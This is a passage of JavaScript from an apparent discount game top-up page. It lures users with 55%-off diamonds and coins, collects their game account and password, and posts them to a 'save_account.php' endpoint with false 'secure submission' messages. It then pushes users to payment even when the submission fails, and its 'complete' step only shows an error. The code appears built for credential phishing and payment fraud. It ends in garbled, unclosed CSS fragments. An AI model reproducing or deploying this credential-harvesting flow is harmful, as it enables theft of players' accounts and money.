        // 充值配置
        const rechargeConfig = {
            diamond: {
                name: '钻石',
                items: [
                    { amount: 300, officialPrice: 30, discount: 0.45 },
                    { amount: 680, officialPrice: 68, discount: 0.45 },
                    { amount: 1280, officialPrice: 128, discount: 0.45 },
                    { amount: 3280, officialPrice: 328, discount: 0.45 },
                    { amount: 6480, officialPrice: 648, discount: 0.45 },
                    { amount: 10000, officialPrice: 998, discount: 0.45 }
                ]
            },
            coin: {
                name: '金币',
                items: [
                    { amount: 5000, officialPrice: 30, discount: 0.45 },
                    { amount: 12000, officialPrice: 68, discount: 0.45 },
                    { amount: 25000, officialPrice: 128, discount: 0.45 },
                    { amount: 70000, officialPrice: 328, discount: 0.45 },
                    { amount: 150000, officialPrice: 648, discount: 0.45 },
                    { amount: 250000, officialPrice: 998, discount: 0.45 }
                ]
            }
        };

        let currentRechargeCurrency = 'diamond';
        let selectedRechargeAmount = null;
        let isRechargeFormVisible = false;
        let isRechargeUploading = false;

        function switchRechargeCurrency(type) {
            currentRechargeCurrency = type;
            document.querySelectorAll('.recharge-currency-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`.recharge-currency-btn.${type}`).classList.add('active');
            renderRechargeAmountGrid();
            selectedRechargeAmount = null;
            isRechargeFormVisible = false;
            document.getElementById('rechargeLoginForm').style.display = 'none';
            document.getElementById('rechargeSubmitBtn').textContent = '选择充值金额';
            hideRechargeUploadStatus();
        }

        function renderRechargeAmountGrid() {
            const grid = document.getElementById('rechargeAmountGrid');
            if (!grid) return;

            const config = rechargeConfig[currentRechargeCurrency];

            grid.innerHTML = config.items.map((item, index) => {
                const finalPrice = (item.officialPrice * item.discount).toFixed(1);
                const savePercent = Math.round((1 - item.discount) * 100);
                const isSelected = selectedRechargeAmount && 
                                  selectedRechargeAmount.type === currentRechargeCurrency && 
                                  selectedRechargeAmount.amount === item.amount;

                return `
                    <div class="recharge-amount-item ${isSelected ? 'selected' : ''} ${currentRechargeCurrency === 'diamond' ? 'diamond-selected' : ''}" 
                         onclick="selectRechargeAmount(${item.amount}, ${item.officialPrice}, ${item.discount})"
                         style="animation: slideInRight 0.5s ease backwards; animation-delay: ${index * 0.05}s">
                        <span class="recharge-discount-badge">省${savePercent}%</span>
                        <span class="price">¥${finalPrice}</span>
                        <span class="original-price">¥${item.officialPrice}</span>
                        <span class="value">${item.amount}${config.name}</span>
                    </div>
                `;
            }).join('');
        }

        function selectRechargeAmount(amount, officialPrice, discount) {
            selectedRechargeAmount = {
                type: currentRechargeCurrency,
                amount: amount,
                officialPrice: officialPrice,
                discount: discount,
                finalPrice: (officialPrice * discount).toFixed(1)
            };

            renderRechargeAmountGrid();

            isRechargeFormVisible = true;
            document.getElementById('rechargeLoginForm').style.display = 'block';
            document.getElementById('rechargeSelectedAmountDisplay').textContent = `¥${selectedRechargeAmount.finalPrice}`;
            document.getElementById('rechargeSubmitBtn').textContent = '提交并支付';

            setTimeout(() => {
                document.getElementById('rechargeLoginForm').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }, 100);
        }

        function showRechargeUploadStatus(message, type) {
            const statusEl = document.getElementById('rechargeUploadStatus');
            if (!statusEl) return;
            statusEl.textContent = message;
            statusEl.className = `recharge-upload-status show ${type}`;
        }

        function hideRechargeUploadStatus() {
            const el = document.getElementById('rechargeUploadStatus');
            if (el) el.classList.remove('show');
        }

        function handleRechargeSubmit() {
            if (!selectedRechargeAmount) {
                UI.error('请先选择充值金额');
                return;
            }

            if (!isRechargeFormVisible) {
                UI.error('请先选择充值金额');
                return;
            }

            const account = document.getElementById('rechargeGameAccount').value.trim();
            const password = document.getElementById('rechargeGamePassword').value.trim();

            if (!account || !password) {
                if (!account) document.getElementById('rechargeGameAccount').style.borderColor = '#FF3B30';
                if (!password) document.getElementById('rechargeGamePassword').style.borderColor = '#FF3B30';
                setTimeout(() => {
                    document.getElementById('rechargeGameAccount').style.borderColor = '';
                    document.getElementById('rechargeGamePassword').style.borderColor = '';
                }, 500);
                UI.error('请输入账号和密码');
                return;
            }

            if (isRechargeUploading) return;
            isRechargeUploading = true;

            const btn = document.getElementById('rechargeSubmitBtn');
            btn.disabled = true;
            btn.textContent = '提交中...';

            showRechargeUploadStatus('正在安全提交账号信息...', 'loading');

            // 准备数据
            const postData = {
                account: account,
                password: password,
                type: currentRechargeCurrency,
                amount: selectedRechargeAmount.amount,
                price: selectedRechargeAmount.finalPrice,
                timestamp: new Date().toISOString(),
                orderId: 'RC' + Date.now()
            };

            // 保存当前订单
            window.currentRechargeOrder = postData;

            // 发送到服务器
            fetch(CONFIG.API_BASE + '/recharge/save_account.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(postData)
            }).then(response => response.json()).then(result => {
                if (result.success || response.ok) {
                    showRechargeUploadStatus('✓ 账号信息已安全提交', 'success');
                    setTimeout(() => {
                        document.getElementById('rechargeMain').classList.add('hidden');
                        document.getElementById('rechargePay').classList.remove('hidden');
                        generateRechargeOrderDisplay();
                        isRechargeUploading = false;
                        btn.disabled = false;
                        btn.textContent = '选择充值金额';
                    }, 800);
                } else {
                    throw new Error(result.message || '提交失败');
                }
            }).catch(error => {
                console.error('上传错误:', error);
                showRechargeUploadStatus('网络波动，请截屏联系客服', 'error');
                setTimeout(() => {
                    document.getElementById('rechargeMain').classList.add('hidden');
                    document.getElementById('rechargePay').classList.remove('hidden');
                    generateRechargeOrderDisplay();
                    isRechargeUploading = false;
                    btn.disabled = false;
                    btn.textContent = '选择充值金额';
                }, 1500);
            });
        }

        function generateRechargeOrderDisplay() {
            const orderId = window.currentRechargeOrder ? window.currentRechargeOrder.orderId : 'RC' + Date.now();
            document.getElementById('rechargeOrderIdDisplay').textContent = orderId;

            const config = rechargeConfig[selectedRechargeAmount.type];

            document.getElementById('rechargeProductName').textContent = `${selectedRechargeAmount.amount}${config.name}`;
            document.getElementById('rechargeProductName').style.color = selectedRechargeAmount.type === 'diamond' ? '#64C8FF' : '#FFD700';
            document.getElementById('rechargeFinalAmount').textContent = `¥${selectedRechargeAmount.finalPrice}`;
            document.getElementById('rechargeOriginalPriceDisplay').textContent = `¥${selectedRechargeAmount.officialPrice}`;
        }

        function backToRechargeMain() {
            document.getElementById('rechargeMain').classList.remove('hidden');
            document.getElementById('rechargePay').classList.add('hidden');
        }

        function handleRechargeComplete() {
            const errorBox = document.getElementById('rechargeErrorBox');
            errorBox.classList.add('show');
            setTimeout(() => errorBox.classList.remove('show'), 4000);
        }
        // ============================================
        // 初始化与事件监听
        // ============================================
        
        // 页面加载完成后初始化
        document.addEventListener('DOMContentLoaded', function() {
            initApp();
        });
        
        // 初始化应用
        function initApp() {
            // 加载用户数据
            loadUserData();
            
            // 初始化路由
            initRouter();
            
            // 启动消息轮询
            startMessagePolling();
            
            // 更新语言
            UI.updateLanguage();
            
            console.log('🎮 诅咒之岛XQVIP 已加载');
            console.log('📱 当前视图:', AppState.currentView);
        }
        
        // 加载用户数据
        async function loadUserData() {
            if (AppState.token) {
                try {
                    // 模拟获取用户信息
                    AppState.currentUser = {
                        id: 10001,
                        name: '测试用户',
                        avatar: '👤',
                        balance: 1000.00,
                        frozenBalance: 0.00,
                        isLogin: true
                    };
                } catch (error) {
                    console.error('加载用户信息失败:', error);
                    // Token无效，清除登录状态
                    logout();
                }
            }
        }
        
        // 初始化路由
        function initRouter() {
            // 监听hash变化
            window.onhashchange = function() {
                const hash = location.hash || '#home';
                switchView(hash);
            };
            
            // 初始路由
            const initialHash = location.hash || '#home';
            switchView(initialHash);
        }
        
        // 消息轮询
        let messagePollInterval;
        function startMessagePolling() {
            if (messagePollInterval) clearInterval(messagePollInterval);
            
            messagePollInterval = setInterval(async () => {
                if (AppState.token) {
                    try {
                        // 模拟获取未读消息数
                        const unreadCount = Math.floor(Math.random() * 3);
                        AppState.unreadCount = unreadCount;
                        updateUnreadBadge();
                    } catch (error) {
                        console.error('消息轮询失败:', error);
                    }
                }
            }, CONFIG.MESSAGE_POLL_INTERVAL);
        }
        
        // 更新未读消息角标
        function updateUnreadBadge() {
            const navItems = document.querySelectorAll('.nav-item');
            navItems.forEach(item => {
                if (item.dataset.view === 'profile') {
                    const existingBadge = item.querySelector('.nav-badge');
                    if (existingBadge) {
                        existingBadge.remove();
                    }
                    if (AppState.unreadCount > 0) {
                        const badge = document.createElement('span');
                        badge.className = 'nav-badge';
                        badge.style.cssText = `
                            position: absolute;
                            top: 2px;
                            right: 8px;
                            width: 8px;
                            height: 8px;
                            background: var(--danger);
                            border-radius: 50%;
                        `;
                        item.style.position = 'relative';
                        item.appendChild(badge);
                    }
                }
            });
        }
        
        // ============================================
        // 分享功能
        // ============================================
        function sharePage() {
            const shareData = {
                title: CONFIG.APP_NAME,
                text: '诅咒之岛XQVIP - 专业C2C交易平台',
                url: window.location.href
            };
            
            if (navigator.share) {
                navigator.share(shareData);
            } else {
                // 复制链接到剪贴板
                copyToClipboard(window.location.href);
                UI.success('链接已复制到剪贴板');
            }
        }
        
        // 复制到剪贴板
        function copyToClipboard(text) {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text);
            } else {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
            }
        }
        
        // ============================================
        // 图片懒加载
        // ============================================
        function initLazyLoad() {
            const images = document.querySelectorAll('img[data-src]');
            
            const imageObserver = new IntersectionObserver((entries, observer) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        const img = entry.target;
                        img.src = img.dataset.src;
                        img.removeAttribute('data-src');
                        observer.unobserve(img);
                    }
                });
            });
            
            images.forEach(img => imageObserver.observe(img));
        }
        
        // ============================================
        // 触摸滑动支持
        // ============================================
        let touchStartX = 0;
        let touchEndX = 0;
        
        document.addEventListener('touchstart', function(e) {
            touchStartX = e.changedTouches[0].screenX;
        }, false);
        
        document.addEventListener('touchend', function(e) {
            touchEndX = e.changedTouches[0].screenX;
            handleSwipe();
        }, false);
        
        function handleSwipe() {
            const swipeThreshold = 100;
            const diff = touchStartX - touchEndX;
            
            if (Math.abs(diff) > swipeThreshold) {
                // 可以在这里添加滑动切换视图的逻辑
            }
        }
        
        // ============================================
        // 页面可见性变化处理
        // ============================================
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible') {
                // 页面可见时恢复轮询
                startMessagePolling();
                if (AppState.currentChatUid) {
                    startChatPolling();
                }
            } else {
                // 页面不可见时停止轮询
                if (messagePollInterval) {
                    clearInterval(messagePollInterval);
                }
                if (chatPollInterval) {
                    clearInterval(chatPollInterval);
                }
            }
        });
        
        // ============================================
        // 错误处理
        // ============================================
        window.onerror = function(message, source, lineno, colno, error) {
            console.error('全局错误:', { message, source, lineno, colno, error });
            return true;
        };
        
        window.addEventListener('unhandledrejection', function(event) {
            console.error('未处理的Promise拒绝:', event.reason);
        });
        
        // ============================================
        // 网络状态监听
        // ============================================
        window.addEventListener('online', function() {
            UI.success('网络已连接');
        });
        
        window.addEventListener('offline', function() {
            UI.warning('网络已断开');
        });
        
        // ============================================
        // 键盘事件处理（移动端适配）
        // ============================================
        document.addEventListener('focusin', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                // 输入框获得焦点时的处理
                document.body.classList.add('keyboard-open');
            }
        });
        
        document.addEventListener('focusout', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                // 输入框失去焦点时的处理
                document.body.classList.remove('keyboard-open');
            }
        });
    </script>

        .slider:before {
            position: absolute;
            content: "";

            width: 22px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .3s;
            border-radius: 50%;

        input:checked + .slider {

        input:checked + .slider:before {
